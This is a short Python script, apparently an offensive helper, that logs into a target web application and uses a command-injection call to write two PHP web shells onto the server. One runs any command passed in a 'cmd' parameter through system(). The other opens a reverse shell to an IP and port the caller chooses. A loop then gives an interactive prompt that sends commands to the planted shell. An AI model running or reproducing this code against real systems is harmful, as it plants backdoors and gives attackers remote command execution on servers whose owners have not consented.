import utils
import urllib.parse

web = """echo '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>' > shell.php"""

rev = """echo '<?php if(isset($_REQUEST["ip"]) && isset($_REQUEST["port"])){ $i = $_REQUEST["ip"]; $p = $_REQUEST["port"];$sock=fsockopen($i,$p);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); } ?>' > RevShell.php"""

def skidyRev(details):
    utils.simpleGET(details, "/", "", 0)
    utils.loginPOST(details)

    try:
        utils.cmdGET(details, rev)
        print("Uploaded Complete!")
    except:
        print("Upload failed!")

def skidyWeb(details):
    utils.simpleGET(details, "/", "", 0)
    utils.loginPOST(details)
    
    try:
        utils.cmdGET(details,web)
        print("Upload Complete!")
    except:
        print("Upload failed")

def skidyAccess(details):
    cmd = b""
    encoding = "utf-8"

    while(cmd.decode(encoding).lower() != "quit"):
        cmd = input("$: ").encode("ascii")
        cmd_encoded = urllib.parse.quote_plus(cmd)
        utils.simpleGET(details, "/shell.php?cmd=", cmd_encoded, 1)
